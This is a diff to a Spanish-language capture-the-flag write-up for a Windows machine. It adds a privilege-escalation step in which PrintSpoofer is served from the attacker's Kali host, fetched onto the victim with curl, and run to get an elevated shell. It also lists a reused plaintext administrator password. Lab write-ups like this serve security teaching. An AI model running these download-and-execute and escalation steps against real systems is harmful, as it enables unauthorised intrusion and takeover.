@@ -106,6 +106,24 @@ La autenticación funciona y consigo una PowerShell como administrador.
 
 ![adminps](images/adminps.png)
 
+El problema es que no es `root` por lo que decido descargar: `PrintSpoofer`
+
+`https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`
+
+Abro en mi máquina (en el directorio donde esta PrintSpoofer) un puerto 80 para transferir el archivo:
+
+`python3 -m http.server 80`
+
+Y desde la máquina victima:
+
+`curl http://IP-De-Kali/PrintSpoofer64.exe -o PrintSpoofer64.exe`
+
+Deberia transferirse el archivo a la máquina victima.
+
+Ejecutamos el archivo y nos abre una shell como `root`
+
+`./PrintSpoofer64.exe -i -c powershell`
+
 ## Resultado
 
 La máquina se compromete reutilizando una contraseña expuesta en `robots.txt`. Primero accedo a Umbraco y luego por RDP como `SG`. Después, al modificar los permisos sobre `restore`, recupero una credencial adicional que me permite abrir una PowerShell elevada.
@@ -122,3 +140,7 @@ La máquina se compromete reutilizando una contraseña expuesta en `robots.txt`.
 8. `runas /user:Administrator powershell`
 9. Introducir `ChangeMeBaby1MoreTime`
 10. `whoami`
+11. Descargar PrintSpoofer
+12. En kali: `python3 -m http.server 80`
+13. En victima: `curl http://IP-De-Kali/PrintSpoofer64.exe -o PrintSpoofer64.exe`
+14. `./PrintSpoofer64.exe -i -c powershell`
